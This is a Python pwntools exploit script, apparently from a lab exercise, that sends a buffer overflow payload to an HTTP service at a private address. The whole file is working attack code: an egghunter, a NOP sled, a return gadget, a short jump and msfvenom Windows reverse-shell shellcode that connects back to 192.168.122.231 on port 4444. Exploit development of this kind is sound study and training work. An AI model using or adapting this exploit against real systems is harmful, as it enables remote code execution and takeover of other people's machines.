#!/usr/bin/env python3

from pwn import *


nops = b'\x90' * 8

island_hop = b'\x31\xc0\x85\xc0\x0f\x84\x11' # xor eax, eax; test eax, eax; je 0x17
egghunter  = b'f\x81\xca\xff\x0fBRj\x02X\xcd.<\x05Zt\xef\xb8w00t\x89\xd7\xafu\xea\xafu\xe7\xff\xe7'

# msfvenom -p windows/shell_reverse_tcp -b '\x00\x0a\0d' -f py LHOST=192.168.122.231 LPORT=4444
shellcode =  b"w00tw00t"
shellcode += b"\xda\xcc\xbd\xb6\xdb\x67\x39\xd9\x74\x24\xf4\x58\x31"
shellcode += b"\xc9\xb1\x52\x83\xe8\xfc\x31\x68\x13\x03\xde\xc8\x85"
shellcode += b"\xcc\xe2\x07\xcb\x2f\x1a\xd8\xac\xa6\xff\xe9\xec\xdd"
shellcode += b"\x74\x59\xdd\x96\xd8\x56\x96\xfb\xc8\xed\xda\xd3\xff"
shellcode += b"\x46\x50\x02\xce\x57\xc9\x76\x51\xd4\x10\xab\xb1\xe5"
shellcode += b"\xda\xbe\xb0\x22\x06\x32\xe0\xfb\x4c\xe1\x14\x8f\x19"
shellcode += b"\x3a\x9f\xc3\x8c\x3a\x7c\x93\xaf\x6b\xd3\xaf\xe9\xab"
shellcode += b"\xd2\x7c\x82\xe5\xcc\x61\xaf\xbc\x67\x51\x5b\x3f\xa1"
shellcode += b"\xab\xa4\xec\x8c\x03\x57\xec\xc9\xa4\x88\x9b\x23\xd7"
shellcode += b"\x35\x9c\xf0\xa5\xe1\x29\xe2\x0e\x61\x89\xce\xaf\xa6"
shellcode += b"\x4c\x85\xbc\x03\x1a\xc1\xa0\x92\xcf\x7a\xdc\x1f\xee"
shellcode += b"\xac\x54\x5b\xd5\x68\x3c\x3f\x74\x29\x98\xee\x89\x29"
shellcode += b"\x43\x4e\x2c\x22\x6e\x9b\x5d\x69\xe7\x68\x6c\x91\xf7"
shellcode += b"\xe6\xe7\xe2\xc5\xa9\x53\x6c\x66\x21\x7a\x6b\x89\x18"
shellcode += b"\x3a\xe3\x74\xa3\x3b\x2a\xb3\xf7\x6b\x44\x12\x78\xe0"
shellcode += b"\x94\x9b\xad\xa7\xc4\x33\x1e\x08\xb4\xf3\xce\xe0\xde"
shellcode += b"\xfb\x31\x10\xe1\xd1\x59\xbb\x18\xb2\xa5\x94\x58\xa5"
shellcode += b"\x4e\xe7\x9c\x38\xd3\x6e\x7a\x50\xfb\x26\xd5\xcd\x62"
shellcode += b"\x63\xad\x6c\x6a\xb9\xc8\xaf\xe0\x4e\x2d\x61\x01\x3a"
shellcode += b"\x3d\x16\xe1\x71\x1f\xb1\xfe\xaf\x37\x5d\x6c\x34\xc7"
shellcode += b"\x28\x8d\xe3\x90\x7d\x63\xfa\x74\x90\xda\x54\x6a\x69"
shellcode += b"\xba\x9f\x2e\xb6\x7f\x21\xaf\x3b\x3b\x05\xbf\x85\xc4"
shellcode += b"\x01\xeb\x59\x93\xdf\x45\x1c\x4d\xae\x3f\xf6\x22\x78"
shellcode += b"\xd7\x8f\x08\xbb\xa1\x8f\x44\x4d\x4d\x21\x31\x08\x72"
shellcode += b"\x8e\xd5\x9c\x0b\xf2\x45\x62\xc6\xb6\x76\x29\x4a\x9e"
shellcode += b"\x1e\xf4\x1f\xa2\x42\x07\xca\xe1\x7a\x84\xfe\x99\x78"
shellcode += b"\x94\x8b\x9c\xc5\x12\x60\xed\x56\xf7\x86\x42\x56\xd2"

padding = b'\x41' * (253 - len(nops) - len(egghunter))

payload = flat(
    nops, egghunter,
    padding,
    p32(0x418674) # pop eax; ret
)

payload = b'%s /%s\r\n\r\n%s' % (island_hop, payload, shellcode)

with remote('192.168.122.44', 80) as r:
    r.write(payload)

